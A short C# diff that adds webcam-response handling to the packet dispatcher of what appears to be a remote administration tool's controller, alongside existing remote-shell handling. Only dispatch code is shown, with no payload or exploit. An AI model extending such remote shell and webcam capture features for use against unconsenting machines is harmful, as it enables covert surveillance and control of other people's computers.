@@ -23,6 +23,14 @@ namespace Serveur.Packets
             {
                 FrmRemoteShellController.getShellCmdExecuteResponse(client, (GetExecuteShellCmdResponse)packet);
             }
+            else if (type == TypePackets.GetAvailableWebcamsResponse)
+            {
+                FrmRemoteWebcamController.getAvailableWebcamsResponse(client, (GetAvailableWebcamsResponse)packet);
+            }
+            else if (type == TypePackets.GetWebcamResponse)
+            {
+                FrmRemoteWebcamController.getWebcamResponse(client, (GetWebcamResponse)packet);
+            }
         }
     }
 }
